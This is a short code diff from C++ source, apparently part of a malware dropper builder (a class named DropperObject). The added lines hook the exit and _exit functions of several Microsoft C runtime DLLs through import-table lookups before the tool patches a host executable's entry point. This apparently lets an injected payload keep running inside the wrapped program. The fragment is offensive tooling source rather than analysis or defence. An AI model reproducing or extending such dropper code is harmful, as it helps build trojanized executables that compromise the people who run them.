@@ -381,6 +381,16 @@ bool DropperObject::build( bf::path core, bf::path core64, bf::path config, bf::
 		_hookedCalls["TerminateProcess"] = _getIATCallIndex(std::string("kernel32.dll"), std::string("TerminateProcess"));
 		_hookedCalls["exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("exit"));
 		_hookedCalls["_exit"] = _getIATCallIndex(std::string("msvcrt.dll"), std::string("_exit"));
+		_hookedCalls["exit6"] = _getIATCallIndex(std::string("msvcr60.dll"), std::string("exit"));
+		_hookedCalls["exit7"] = _getIATCallIndex(std::string("msvcr70.dll"), std::string("exit"));
+		_hookedCalls["exit8"] = _getIATCallIndex(std::string("msvcr80.dll"), std::string("exit"));
+		_hookedCalls["exit9"] = _getIATCallIndex(std::string("msvcr90.dll"), std::string("exit"));
+		_hookedCalls["exit10"] = _getIATCallIndex(std::string("msvcr100.dll"), std::string("exit"));		
+		_hookedCalls["_exit6"] = _getIATCallIndex(std::string("msvcr60.dll"), std::string("_exit"));
+		_hookedCalls["_exit7"] = _getIATCallIndex(std::string("msvcr70.dll"), std::string("_exit"));
+		_hookedCalls["_exit8"] = _getIATCallIndex(std::string("msvcr80.dll"), std::string("_exit"));
+		_hookedCalls["_exit9"] = _getIATCallIndex(std::string("msvcr90.dll"), std::string("_exit"));
+		_hookedCalls["_exit10"] = _getIATCallIndex(std::string("msvcr100.dll"), std::string("_exit"));
 		
 		_build( (WINSTARTFUNC) _pe.epVA() );
 		
